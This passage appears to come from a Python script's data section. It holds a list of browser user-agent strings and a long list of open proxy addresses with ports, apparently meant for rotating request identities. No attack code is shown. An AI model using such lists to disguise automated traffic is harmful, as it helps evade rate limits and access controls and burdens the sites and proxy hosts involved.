Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (Linux; Android 4.4.3; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12B466 Safari/600.1.4
Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/534.34
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; MAAU; NP08; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.2; LG-V410 Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0
Mozilla/5.0 (X11; CrOS x86_64 6946.70.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (iPod touch; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 IceDragon/38.0.5 Firefox/38.0.5
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; managedpc; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.0.3; en-ca; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; Le Pan TC802A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/6.0.51363 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; Lumia 1520) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.87 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; PRU_IE; rv:11.0) like Gecko
Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPad4,1;FBMD/iPad;FBSN/iPhone OS;FBSV/8.4.1;FBSS/2; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP02; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (X11; CrOS x86_64 6946.63.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; QMV7B Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko
Mozilla/5.0 (compatible; MSIE 10.0; AOL 9.7; AOLBuild 4343.1028; Windows NT 6.1; WOW64; Trident/7.0)
Mozilla/5.0 (Linux; U; Android 4.0.3; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; Active Content Browser)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; WebView/1.0)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36
Mozilla/5.0 (iPad; U; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.0.125 Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4"""
]

proxy = [
"""82.179.248.248:80
65.21.206.151:3128
62.182.66.251:9090
12.151.56.30:80
45.56.83.46:80
157.245.167.115:80
134.209.25.223:3128
161.35.78.6:80
51.15.100.229:3128
188.165.59.127:80
54.216.254.207:9000
104.236.73.28:80
173.212.216.104:3128
80.85.86.240:1235
178.209.51.218:7829
152.89.216.110:3128
20.230.193.232:80
51.250.80.131:80
213.230.90.106:3128
103.117.192.14:80
159.69.220.40:3128
103.127.1.130:80
195.189.123.213:3128
20.110.214.83:80
120.77.65.221:30001
169.57.1.85:8123
47.108.118.29:30001
195.135.242.141:8081
20.47.108.204:8888
123.56.222.253:30001
195.158.3.198:3128
103.115.252.18:80
50.205.202.249:3128
203.215.166.162:3128
47.97.126.226:30001
41.65.174.34:1981
39.104.19.120:8080
12.202.136.44:80
156.200.116.76:1976
103.117.231.42:80
103.115.26.254:80
64.238.140.247:3128
212.112.113.178:3128
154.236.184.70:1981
47.243.138.208:6677
168.8.172.2:80
66.196.238.181:3128
195.123.245.120:80
195.29.76.14:8080
35.170.197.3:8888
209.97.150.167:3128
45.167.124.5:9992
213.137.240.243:81
143.198.242.86:8048
178.254.41.91:8118
82.148.5.173:8888
185.82.98.22:8091
157.245.33.179:80
153.122.1.160:80
103.60.161.2:80
185.148.223.76:3128
103.217.213.125:55443
117.54.114.103:80
117.54.114.96:80
172.105.190.51:80
221.4.241.198:9091
103.145.76.44:80
122.155.165.191:3128
8.213.137.21:6969
185.51.10.19:80
195.211.219.146:5555
111.91.176.182:80
120.26.14.114:8888
34.132.27.0:3128
61.79.139.30:80
58.246.58.150:9002
139.9.64.238:443
103.231.78.36:80
183.111.25.253:80
195.158.30.232:3128
111.72.218.180:9091
159.89.195.14:80
119.184.185.80:8118
104.128.228.69:8118
209.166.175.201:8080
186.176.212.214:9080
176.214.97.13:8081
5.252.161.48:3128
106.14.255.124:80
211.103.138.117:8000
213.32.75.44:9300
221.6.201.74:9999
27.255.58.74:8080
182.253.181.10:8080
82.140.235.246:55443
121.199.78.228:8888
82.114.97.157:1256
197.243.14.59:8888
103.155.199.24:8181
102.164.252.150:8080
58.20.184.187:9091
80.246.128.14:8080
39.107.33.254:8090
49.7.19.74:80
222.65.228.80:8085
117.54.114.100:80
5.252.161.48:8080
203.243.51.111:8001
212.46.230.102:6969
47.74.152.29:8888
123.56.175.31:3128
94.23.77.8:3128
213.212.210.252:1981
154.66.109.209:8080
206.189.23.38:8048
120.220.220.95:8085
202.180.20.11:55443
156.200.116.76:1981
89.232.202.106:3128
211.138.6.37:9091
41.65.236.48:1981
213.222.34.200:53281
190.26.201.194:8080
142.93.215.210:80
85.121.211.139:2019
103.119.60.12:80
103.148.72.126:80
120.237.57.83:9091
185.31.175.15:8080
103.14.234.238:8080
136.228.160.250:8080
47.176.153.17:80
85.221.247.236:8080
61.191.56.60:8085
154.85.58.149:80
112.126.85.190:8118
74.82.50.155:3128
43.255.113.232:8081
113.161.85.18:19132
222.111.184.59:80
89.218.186.134:3128
47.252.4.64:8888
157.100.12.138:999
103.147.77.66:5012
46.250.88.194:3128
110.170.126.13:3128
103.123.64.20:8888
94.102.193.77:1500
185.172.129.138:3128
201.77.108.130:999
122.15.131.65:57873
94.242.54.119:3128
45.181.122.74:999
176.196.250.86:3128
109.194.101.128:3128
45.185.206.30:999
110.77.236.107:8080
41.254.45.128:8080
91.107.15.221:53281
156.200.116.72:1981
41.65.251.83:1976
112.6.117.135:8085
95.217.84.58:8118
80.252.5.34:7001
185.127.224.60:41890
167.114.185.69:3128
95.0.7.17:8080
152.32.218.99:8000
176.115.197.118:8080
146.56.159.124:1081
167.235.63.238:3128
176.57.188.32:443
58.20.235.180:9091
196.192.168.77:8080
142.132.143.86:11294
183.247.202.208:30001
161.97.74.153:81
194.233.77.110:6666
103.103.3.6:8080
154.236.168.181:1981
122.116.150.2:9000
171.6.17.29:8080
61.61.26.181:80
63.151.67.7:8080
202.50.53.107:8080
51.250.17.27:8080
88.255.201.134:8080
45.190.79.176:999
200.116.198.177:35184
181.63.213.66:8089
190.90.242.210:999
5.35.81.55:32132
154.236.168.179:1976
167.71.199.228:8080
202.142.158.114:8080
186.150.202.130:8080
103.146.30.178:8080
138.0.91.227:999
124.222.122.46:7890
103.42.162.50:8080
123.56.106.161:8888
116.62.39.130:443
179.93.65.233:8080
178.124.189.174:3128
82.114.106.40:1256
181.209.102.43:999
183.111.25.253:8080
177.101.110.113:53281
121.156.109.108:8080
122.2.28.114:8080
41.178.6.118:8060
163.139.219.22:8080
185.246.153.10:3128
220.179.118.244:8080
45.172.111.11:999
181.143.106.162:52151
69.43.44.106:8080
86.110.27.165:3128
165.16.30.161:8080
217.30.170.213:3128
85.195.104.71:80
45.175.239.17:999
223.29.199.144:55443
95.216.194.46:1081
176.9.139.141:8080
93.188.161.84:80
36.95.133.234:8080
67.212.186.101:80
79.142.95.90:55443
177.124.184.52:8080
41.65.236.56:1981
183.89.115.221:8081
185.255.47.59:9812
136.228.239.67:8082
124.204.33.162:8000
190.90.8.74:8080
139.255.26.115:8080
61.19.145.66:8080
103.148.178.228:80
91.234.127.222:53281
103.159.196.215:1085
177.91.98.252:8080
34.142.54.87:80
41.65.236.44:1981
158.69.64.142:9300
103.119.95.254:4321
65.108.18.140:444
177.70.172.245:8080
154.85.35.235:8888
190.107.224.150:3128
5.160.121.142:8080
181.118.158.131:999
167.114.96.27:9300
45.174.240.61:999
158.69.53.132:9300
46.105.35.193:8080
159.65.133.175:31280
137.74.223.236:6036
223.71.195.72:9091
95.216.137.15:31337
181.192.2.23:8080
118.31.166.135:3128
20.239.2.157:80
43.255.113.232:86
103.141.247.6:8080
83.174.218.83:8080
213.230.69.193:3128
197.210.217.66:34808
27.116.51.119:8080
45.189.254.10:999
201.197.202.244:8080
188.170.62.82:81
185.220.181.50:8080
167.250.180.2:6969
187.188.169.169:8080
186.5.117.82:999
114.67.104.36:18888
103.159.68.147:8080
212.174.44.41:8080
45.172.111.89:999
180.183.226.187:8080
190.14.249.119:999
91.224.168.22:8080
112.78.32.62:3127
146.158.92.137:8080
181.224.207.20:999
193.68.152.102:8080
95.217.20.255:51222
157.230.34.219:3128
181.65.189.90:9812
188.133.137.9:8081
76.81.164.246:8080
131.72.68.107:40033
122.102.118.83:8080
39.99.54.91:80
45.145.20.213:3128
103.166.210.123:443
79.122.225.167:8080
89.208.35.81:3128
85.217.192.39:1414
46.191.235.167:443
188.133.157.61:10000
45.181.121.73:999
200.222.137.202:8080
37.210.128.139:8080
51.79.50.46:9300
117.54.11.82:3128
2.188.164.194:8080
67.73.184.178:8081
103.156.14.180:3127
50.231.95.3:8080
201.71.2.107:999
178.255.44.199:41890
41.186.44.106:3128
191.102.125.245:8080
1.179.144.41:8080
103.208.200.115:23500
118.179.9.26:8889
91.197.77.118:443
183.91.0.124:3128
103.180.126.28:8080
45.5.68.59:999
177.185.93.55:8080
201.184.176.107:8080
170.238.91.50:8080
186.3.44.182:999
41.203.83.66:8080
138.122.147.122:8080
103.109.57.250:8889
201.220.102.146:8080
125.99.114.105:40390
14.207.85.37:8080
200.105.215.18:33630
116.21.121.2:808
88.255.94.2:8080
176.62.178.247:47556
182.253.28.124:8080
112.133.215.24:8080
160.226.240.213:8080
88.255.65.117:8080
161.49.176.173:1337
43.250.127.98:9001
186.215.68.51:3127
93.171.192.28:8080
178.134.157.215:8080
190.60.36.61:8080
79.143.30.163:8080
185.15.172.212:3128
120.29.124.131:8080
103.7.27.186:8080
45.173.4.3:8081
103.173.128.51:8080
200.16.208.187:8080
115.96.208.124:8080
183.88.213.85:8080
170.239.222.89:8080
185.91.116.156:80
176.236.141.30:10001
31.173.10.58:3128
43.129.29.58:8090
206.189.136.49:3128
183.88.197.144:8080
212.126.106.230:8889
182.176.164.41:8080
185.82.99.206:9093
188.133.136.57:1256
188.165.59.127:3128
181.205.116.218:9812
78.29.36.210:9080
45.189.254.150:999
103.144.165.86:8080
190.6.54.5:8080
165.16.27.32:1981
182.253.65.17:8085
203.210.84.171:8181
202.180.20.66:8080
203.190.44.81:8090
151.106.18.122:1080
152.169.204.172:8082
103.164.112.124:10001
212.114.31.231:8080
151.22.181.214:8080
41.216.178.138:8090
66.29.154.103:3128
87.76.1.69:8080
179.1.77.222:999
170.83.78.1:999
151.22.181.215:8080
45.190.79.164:999
103.122.32.10:8080
181.57.192.245:999
177.105.232.114:8080
201.158.47.66:8080
179.191.245.170:3128
37.111.51.222:8080
14.177.235.17:8080
179.184.224.91:3128
117.198.97.220:80
212.174.44.156:8080
119.236.225.42:3128
195.250.92.58:8080
176.53.197.226:3128
103.131.18.119:8080
212.49.92.213:8080
187.216.73.18:8080
185.20.198.108:8080
95.217.72.247:3128
36.67.27.189:39674
181.129.98.146:8080
181.74.81.195:999
103.166.39.33:8080
103.120.175.119:9191
218.244.147.59:3128
103.156.248.12:8080
200.110.168.159:8080
103.169.187.201:8080
45.182.190.179:999
196.1.97.209:80
103.250.153.203:8080
193.163.116.3:8080
178.63.244.28:8083
139.255.77.74:8080
110.74.206.134:8080
154.64.211.145:999
36.94.2.138:443
194.233.73.105:443
183.88.232.207:8080
188.169.38.111:8080
105.243.252.21:8080
121.101.132.6:8080
103.16.69.126:83
103.120.175.47:9191
80.244.229.102:10000
151.106.18.124:1080
190.113.43.66:999
39.108.56.233:38080
188.0.147.102:3128
45.182.22.54:999
85.121.208.158:2019
49.156.42.210:8080
173.212.245.135:3128
200.229.147.2:999
103.163.236.78:8081
45.184.103.67:999
102.222.136.56:8080
185.255.46.121:8080
190.217.14.18:999
177.242.130.90:999
36.65.10.185:8080
103.106.112.18:1234
36.94.58.26:4480
138.121.113.182:999
190.186.18.177:999
190.61.41.106:999
45.180.10.197:999
91.233.111.49:1080
139.59.1.14:8080
1.20.166.142:8080
50.236.203.15:8080
200.32.51.179:8080
67.212.83.55:1080
122.3.41.154:8090
207.180.199.65:3128
103.152.232.234:8080
103.126.87.86:3127
222.64.109.23:9000
154.236.189.28:8080
181.205.106.106:9812
124.158.167.26:8080
67.212.186.102:80
203.76.114.197:8080
175.106.10.164:8089
5.189.140.161:3128
117.121.202.182:8099
92.60.238.12:8080
185.141.10.227:34082
61.135.155.82:443
195.140.226.244:8080
165.16.22.150:9999
201.28.39.6:3128
103.47.175.161:83
103.85.112.78:8090
41.254.49.146:8080
217.11.79.232:8080
66.94.116.111:3128
181.209.108.3:999
177.190.80.226:8080
101.128.86.22:8085
176.235.131.229:9090
67.212.83.54:1080
114.6.88.238:60811
165.0.50.110:8080
66.29.154.105:3128
67.212.186.99:80
103.156.128.28:8080
79.140.17.172:8016
5.9.210.36:9191
101.51.139.179:8080
200.54.22.74:8080
161.49.91.13:1337
200.24.159.163:999
170.210.4.222:37409
103.153.191.187:8080
138.59.187.33:666
91.150.189.122:30389
47.89.185.178:8888
88.255.64.94:8080
103.164.56.114:8080
102.66.104.192:9999
131.0.207.79:8080
103.178.43.14:8181
131.100.51.250:999
197.232.65.40:55443
66.94.97.238:443
51.15.42.134:8118
47.112.122.163:82
103.80.83.254:8181
95.214.123.200:8080
178.205.169.210:3128
103.243.114.206:8080
185.189.103.143:8080
197.246.171.158:8080
181.48.101.245:3128
190.2.210.186:999
66.181.164.125:8080
161.132.122.61:999
202.40.188.94:40486
152.231.25.114:8080
138.121.161.84:8096
79.111.191.130:41890
200.37.199.186:999
185.103.168.78:8080
103.227.141.90:8181
101.200.127.149:3129
177.126.151.162:8081
41.254.53.70:1981
79.129.147.177:8080
45.179.69.42:3180
182.90.224.115:3128
85.163.229.35:8081
36.94.161.219:8080
200.60.119.131:9991
203.112.223.126:8080
103.125.50.102:10001
152.231.25.198:60080
45.173.44.9:999
87.103.175.250:9812
180.191.20.102:8080
201.217.49.2:80
45.114.118.81:3128
200.106.184.12:999
45.248.41.216:9812
180.178.106.137:8080
45.172.111.20:999
45.175.239.85:999
47.89.153.213:80
79.147.98.145:8080
202.52.13.2:8089
222.129.141.180:9000
103.155.54.20:83
200.46.65.66:8080
204.199.72.90:999
23.229.21.168:3128
36.92.111.49:9812
185.204.197.169:8080
80.244.230.86:8080
110.74.195.34:25
80.65.28.57:30962
118.99.102.226:8080
200.105.170.214:8080
202.158.15.146:55667
203.190.44.10:3127
185.32.6.131:8090
159.65.69.186:9300
36.93.127.98:3128
43.228.125.189:8080
85.221.247.238:8080
64.210.67.19:999
113.160.241.196:19132
121.229.132.241:9999
49.232.237.134:8080
117.54.114.97:80
117.54.114.33:80
103.66.196.218:23500
212.3.216.8:8080
219.138.229.131:9091
95.104.54.227:42119
1.20.169.43:8080
109.167.245.78:8080
43.255.113.232:8083
45.149.43.56:53281
95.217.72.253:3128
91.67.201.74:8118
45.156.31.57:9090
157.119.211.133:8080
151.80.196.163:8010
8.215.38.183:8080
110.235.246.197:8080
216.155.89.66:999
113.111.212.9:9797
43.224.10.8:6666
69.75.140.157:8080
103.140.35.156:9812
200.69.78.90:999
191.102.74.113:8080
138.199.15.141:8080
188.168.28.88:81
103.156.144.5:83
124.158.175.26:8080
173.82.149.243:8080
149.34.2.39:8080
213.165.168.190:9898
103.78.162.68:9812
217.21.214.139:8080
177.54.229.1:9292
49.156.42.188:8080
202.77.120.38:57965
103.83.116.202:55443
183.88.52.181:8080
200.60.60.60:999
41.65.67.166:1976
91.238.52.18:7777
45.71.115.203:999
36.67.57.45:30066
173.197.167.242:8080
181.176.221.151:9812
54.39.102.233:3128
75.106.98.189:8080
190.119.211.42:9812
202.180.20.10:55443
194.233.73.108:443
213.171.63.210:41890
5.104.174.199:23500
43.255.113.232:8086
36.255.86.114:83
86.51.157.252:8080
200.69.74.166:6996
88.255.101.228:8080
79.120.177.106:8080
212.126.96.154:8080
37.237.205.30:9812
94.75.76.3:8080
102.38.17.101:8080
62.33.210.34:8333
103.159.46.14:83
181.224.207.21:999
222.173.172.94:8000
212.174.44.96:8085
177.136.32.214:45005
36.93.44.2:8080
124.158.167.173:8080
36.37.180.59:65205
103.164.99.58:8181
18.188.193.74:3128
159.89.200.210:8080
186.96.56.9:999
91.106.64.94:9812
187.62.191.3:61456
43.224.10.43:6666
45.6.4.58:8080
203.81.95.42:8080
190.186.1.121:999
38.65.138.28:999
47.92.113.71:80
115.127.95.82:8080
187.194.17.152:8080
201.222.45.65:999
103.47.66.154:8080
102.38.5.161:8080
8.242.150.90:999
170.233.235.249:3128
45.225.184.177:999
193.163.116.5:8080
41.65.236.48:1976
190.109.18.65:8080
103.228.246.37:3127
45.70.1.81:5566
183.88.212.184:8080
202.62.62.34:9812
178.254.18.170:3128
190.247.250.112:8080
45.145.20.213:80
202.138.240.189:8888
124.222.77.10:8080
43.225.185.154:8080
110.74.208.153:21776
183.88.219.206:41564
36.92.22.70:8080
190.104.180.94:999
27.72.149.205:8080
8.242.207.202:8080
139.59.244.166:8080
38.130.249.137:999
45.173.6.98:999
115.225.206.186:7890
118.67.219.153:8080
160.19.232.85:3128
62.182.114.164:60731
103.168.190.106:8080
45.186.60.246:8085
196.15.213.235:3128
203.130.23.250:8080
45.171.144.243:8083
45.172.111.12:999
202.180.17.86:8080
202.152.24.50:8080
190.11.192.118:999
43.250.107.91:80
202.62.11.197:8080
47.57.188.208:80
94.181.48.171:1256
103.149.162.195:80
36.91.166.98:8080
103.139.242.173:83
179.1.88.30:999
103.120.153.58:84
110.164.59.98:8080
103.48.71.124:83
201.91.82.155:3128
201.28.102.234:8080
45.185.206.73:999
103.35.132.18:83
186.71.151.42:1990
103.159.46.2:83
194.233.69.38:443
95.165.163.188:60103
36.95.73.141:80
184.82.54.174:8080
64.119.29.22:8080
45.226.28.1:999
103.147.77.66:3125
103.161.164.105:8181
91.235.75.33:8282
102.66.104.106:9998
187.109.40.193:20183
181.78.19.197:999
111.118.128.123:8080
103.59.213.29:8080
203.153.125.242:8080
119.42.86.186:8080
14.248.80.77:8080
201.71.2.41:999
1.10.141.220:54620
103.14.130.39:8080
161.117.89.36:8888
45.174.148.162:999
24.106.221.230:53281
200.39.136.129:999
213.81.199.8:4040
103.105.228.134:8080
202.162.214.243:8080
177.247.7.158:8080
202.152.51.44:8080
130.41.85.158:8080
103.156.225.178:3128
115.127.162.234:8080
183.5.87.242:9797
202.75.97.82:47009
45.177.109.220:999
176.102.69.35:8080
38.104.176.34:999
176.192.80.10:3128
189.193.224.222:999
110.235.249.226:8080
66.94.120.161:443
176.241.89.244:53583
189.203.234.146:999
103.173.172.1:8888
37.120.192.154:8080
190.186.18.161:999
185.94.215.18:8080
139.255.25.85:3128
36.94.142.165:8080
68.64.250.38:8080
170.246.85.108:50991
103.133.177.141:443
194.181.134.81:8080
123.25.15.209:9812
179.0.176.3:3180
202.147.206.98:8080
190.121.153.93:999
43.255.113.232:84
91.194.239.122:8080
152.231.25.195:60080
202.158.77.194:80
201.217.246.178:8080
202.164.152.229:8080
110.171.84.180:8080
36.95.133.236:8080
110.49.11.50:8080
201.120.27.15:53281
181.48.23.250:8080
177.101.55.34:9090
185.190.38.150:8080
37.18.73.85:5566
217.153.211.98:8080
190.113.41.220:999
194.233.69.90:443
103.70.79.3:8080
187.63.156.166:999
95.167.29.50:8080
178.49.151.33:8091
182.160.108.188:8090
103.242.106.146:3128
120.79.136.134:8080
200.106.184.13:999
43.155.111.39:80
196.3.99.162:8080
61.9.53.157:1337
79.143.179.141:3128
200.54.194.10:53281
45.189.117.237:999
103.60.173.6:8080
45.238.37.32:8080
103.97.46.214:83
187.45.127.87:20183
65.18.114.254:55443
128.201.213.232:8080
105.112.84.117:8080
36.91.216.243:8080
80.244.229.55:1256
41.193.84.196:3128
36.92.134.71:999
103.119.55.21:8082
190.14.238.198:999
103.159.90.42:83
181.114.192.1:3128
181.129.2.90:8081
175.100.72.95:57938
109.110.72.151:8080
36.95.173.178:8080
